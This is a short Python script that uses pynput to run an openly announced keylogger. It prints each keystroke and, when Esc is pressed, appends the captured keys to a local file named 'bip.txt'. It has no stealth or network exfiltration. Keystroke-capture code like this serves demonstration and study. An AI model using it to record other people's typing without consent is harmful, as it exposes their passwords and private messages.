from pynput.keyboard import Key, Listener

pressed_keys = []

def on_press(key):
    pressed_keys.append(key)
    print(f"Key {key} pressed.")

def on_release(key):
    if key == Key.esc:
        write_keys_to_file(pressed_keys)
        print("Logging keys to file...")
        return False

def write_keys_to_file(keys):
    with open("bip.txt", "a") as f:
        for key in keys:
            new_key = str(key).replace("'", "")
            if "Key" in new_key:
                new_key = new_key.replace("Key.", "")
            f.write(new_key)
            f.write(" ")
    keys.clear()

print("Keylogger is active. Press keys to log them.")
print("Press 'Esc' key to stop and log the keys to file.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keys logged and saved to 'bip.txt'.")
